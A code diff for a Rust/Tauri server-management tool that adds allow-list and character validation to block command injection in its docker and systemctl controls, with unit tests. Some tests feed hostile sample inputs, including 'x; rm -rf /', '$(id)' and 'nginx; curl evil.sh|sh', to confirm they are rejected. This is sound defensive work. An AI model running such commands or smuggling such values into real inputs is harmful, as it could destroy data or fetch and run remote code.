@@ -8,7 +8,7 @@
 use serde::{Deserialize, Serialize};
 use tauri::State;
 
-use crate::error::AppResult;
+use crate::error::{AppError, AppResult};
 use crate::executor::{execute_and_audit, AuditContext};
 use crate::AppState;
 
@@ -226,7 +226,15 @@ pub async fn list_containers(
     server_id: i64,
     runtime: Option<String>, // "docker" | "podman",默认自动检测
 ) -> AppResult<Vec<ContainerInfo>> {
-    let rt = runtime.unwrap_or_else(|| "docker".to_string());
+    let rt = match runtime.as_deref() {
+        None | Some("docker") => "docker",
+        Some("podman") => "podman",
+        Some(other) => {
+            return Err(AppError::InvalidInput(format!(
+                "不支持的容器 runtime: {other} (允许: docker/podman)"
+            )))
+        }
+    };
     let cmd = format!(
         "{rt} ps -a --format '{{{{.ID}}}}|{{{{.Names}}}}|{{{{.Image}}}}|{{{{.Status}}}}|{{{{.State}}}}'"
     );
@@ -241,7 +249,7 @@ pub async fn list_containers(
                 image: parts[2].to_string(),
                 status: parts[3].to_string(),
                 state: parts[4].to_string(),
-                runtime: rt.clone(),
+                runtime: rt.to_string(),
             });
         }
     }
@@ -257,12 +265,43 @@ pub struct ContainerAction {
     pub session_id: Option<String>,
 }
 
+/// 容器操作白名单(防命令注入:action 来自前端,必须枚举校验)
+const CONTAINER_ACTIONS: [&str; 4] = ["start", "stop", "restart", "remove"];
+
+/// 容器 ID 字符集校验(十六进制 ID 或名称:字母数字 + `-_.:`)
+fn is_safe_container_id(s: &str) -> bool {
+    !s.is_empty()
+        && s.len() <= 128
+        && s.chars().all(|c| c.is_ascii_alphanumeric() || "-_.:/".contains(c))
+}
+
+/// systemd 服务操作白名单
+const SERVICE_ACTIONS: [&str; 6] = ["start", "stop", "restart", "enable", "disable", "status"];
+
+/// systemd 服务名校验(字母数字 + `-_.:@`,如 nginx.service)
+fn is_safe_service_name(s: &str) -> bool {
+    !s.is_empty()
+        && s.len() <= 128
+        && s.chars().all(|c| c.is_ascii_alphanumeric() || "-_.:@".contains(c))
+}
+
 #[tauri::command]
 pub async fn control_container(
     state: State<'_, AppState>,
     server_id: i64,
     action: ContainerAction,
 ) -> AppResult<serde_json::Value> {
+    if !CONTAINER_ACTIONS.contains(&action.action.as_str()) {
+        return Err(AppError::InvalidInput(format!(
+            "不支持的容器操作: {} (允许: {})",
+            action.action,
+            CONTAINER_ACTIONS.join("/")
+        )));
+    }
+    if !is_safe_container_id(&action.container_id) {
+        return Err(AppError::InvalidInput("容器 ID/名称包含非法字符".into()));
+    }
+
     let server_host = fetch_server_host(&state, server_id).await;
     let cmd = format!("docker {} {}", action.action, action.container_id);
     let ctx = AuditContext {
@@ -270,10 +309,7 @@ pub async fn control_container(
         session_id: action.session_id,
         tool_name: format!("container_{}", action.action),
         command: Some(cmd.clone()),
-        args: Some(format!(
-            "{{\"container\":\"{}\"}}",
-            action.container_id
-        )),
+        args: Some(serde_json::json!({ "container": action.container_id }).to_string()),
         approved_by: Some("user".into()),
         proposal_id: None,
     };
@@ -308,7 +344,10 @@ pub async fn list_services(
     state: State<'_, AppState>,
     server_id: i64,
 ) -> AppResult<Vec<ServiceInfo>> {
-    let cmd = "systemctl list-units --type=service --all --no-legend --no-pager | awk '{print $1,$2,$3,$4; $1=$2=$3=$4=\"\"; print substr($0,9)}'";
+    // 两行输出一行:第一行 4 个字段,第二行仅描述。
+    // 注意:不能用 substr($0,9) 截描述 —— 把 $1..$4 置空后 OFS 会重建 $0,固定偏移会多切字符;
+    // 用 sub(/^ +/, "") 只去前导空格。
+    let cmd = "systemctl list-units --type=service --all --no-legend --no-pager | awk '{print $1,$2,$3,$4; $1=$2=$3=$4=\"\"; sub(/^ +/, \"\"); print}'";
     let result = state.ssh.run_command(server_id, cmd).await?;
     let mut services = Vec::new();
     let mut lines = result.stdout.lines();
@@ -337,6 +376,16 @@ pub async fn control_service(
     action: String, // start/stop/restart/enable/disable/status
     session_id: Option<String>,
 ) -> AppResult<serde_json::Value> {
+    if !SERVICE_ACTIONS.contains(&action.as_str()) {
+        return Err(AppError::InvalidInput(format!(
+            "不支持的服务操作: {action} (允许: {})",
+            SERVICE_ACTIONS.join("/")
+        )));
+    }
+    if !is_safe_service_name(&service_name) {
+        return Err(AppError::InvalidInput("服务名包含非法字符".into()));
+    }
+
     let server_host = fetch_server_host(&state, server_id).await;
     let cmd = format!("systemctl {} {}", action, service_name);
     let ctx = AuditContext {
@@ -344,7 +393,7 @@ pub async fn control_service(
         session_id,
         tool_name: format!("service_{}", action),
         command: Some(cmd.clone()),
-        args: Some(format!("{{\"service\":\"{service_name}\"}}")),
+        args: Some(serde_json::json!({ "service": service_name }).to_string()),
         approved_by: Some("user".into()),
         proposal_id: None,
     };
@@ -357,4 +406,100 @@ pub async fn control_service(
         "exit_code": result.exit_code,
         "success": result.success(),
     }))
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    // ============ 白名单校验(命令注入防线) ============
+
+    #[test]
+    fn container_id_accepts_valid_names() {
+        assert!(is_safe_container_id("a1b2c3"));
+        assert!(is_safe_container_id("nginx-prod"));
+        assert!(is_safe_container_id("my_redis.1"));
+        assert!(is_safe_container_id("abc123:latest"));
+    }
+
+    #[test]
+    fn container_id_rejects_injection() {
+        assert!(!is_safe_container_id("x; rm -rf /"));
+        assert!(!is_safe_container_id("$(id)"));
+        assert!(!is_safe_container_id("`whoami`"));
+        assert!(!is_safe_container_id("a|b"));
+        assert!(!is_safe_container_id("a&&b"));
+        assert!(!is_safe_container_id(""));
+        assert!(!is_safe_container_id(&"x".repeat(200))); // 超长
+        assert!(!is_safe_container_id("a b")); // 空格
+    }
+
+    #[test]
+    fn service_name_rejects_injection() {
+        assert!(is_safe_service_name("nginx.service"));
+        assert!(is_safe_service_name("docker@containerd"));
+        assert!(!is_safe_service_name("nginx; curl evil.sh|sh"));
+        assert!(!is_safe_service_name("a$(reboot)"));
+        assert!(!is_safe_service_name(""));
+    }
+
+    #[test]
+    fn container_actions_are_whitelisted() {
+        for a in ["start", "stop", "restart", "remove"] {
+            assert!(CONTAINER_ACTIONS.contains(&a));
+        }
+        assert!(!CONTAINER_ACTIONS.contains(&"rm"));
+        assert!(!CONTAINER_ACTIONS.contains(&"exec"));
+    }
+
+    // ============ 监控指标解析 ============
+
+    #[test]
+    fn parse_cpu_line_extracts_usage() {
+        // 真实 top -bn1 输出:字段逗号分隔,idle 字段单独出现
+        assert_eq!(parse_cpu_line("%Cpu(s):  5.0 us,  2.0 sy, 93.0 id,  0.0 wa"), Some(7.0));
+        assert_eq!(
+            parse_cpu_line("%Cpu(s):  0.0 us,  0.0 sy, 100.0 id,  0.0 wa,  0.0 hi"),
+            Some(0.0)
+        );
+        assert!(parse_cpu_line("garbage").is_none());
+    }
+
+    #[test]
+    fn parse_metrics_handles_typical_output() {
+        let output = r#"===CPU===
+%Cpu(s):  5.0 us,  2.0 sy, 93.0 id,  0.0 wa,  0.0 hi
+===MEM===
+              total        used        free      shared  buff/cache   available
+Mem:        8010000     3123456     1234567      123456   3651977     4321000
+Swap:       2097152           0     2097152
+===LOAD===
+0.52 0.30 0.15 1/234 12345
+===UPTIME===
+123456.78 234567.89
+===DISK===
+Filesystem     1024-blocks     Used Available Capacity Mounted on
+/dev/sda1       20411392   8123456  11287679      42% /
+"#;
+        let m = parse_metrics(output).expect("解析成功");
+        assert!((m.cpu_usage - 7.0).abs() < 1e-6);
+        assert_eq!(m.mem_total, 8_010_000);
+        assert_eq!(m.mem_used, 3_123_456);
+        assert_eq!(m.mem_available, 4_321_000);
+        assert_eq!(m.swap_total, 2_097_152);
+        assert!((m.load_1 - 0.52).abs() < 1e-6);
+        assert_eq!(m.uptime_seconds, 123_456);
+        assert_eq!(m.disks.len(), 1);
+        assert_eq!(m.disks[0].filesystem, "/dev/sda1");
+        assert_eq!(m.disks[0].mount, "/");
+        assert!((m.disks[0].usage_percent - 8123456.0 / 20411392.0 * 100.0).abs() < 1e-6);
+    }
+
+    #[test]
+    fn parse_metrics_empty_output_returns_defaults() {
+        let m = parse_metrics("").expect("空输出不报错");
+        assert_eq!(m.cpu_usage, 0.0);
+        assert_eq!(m.mem_total, 0);
+        assert!(m.disks.is_empty());
+    }
 }
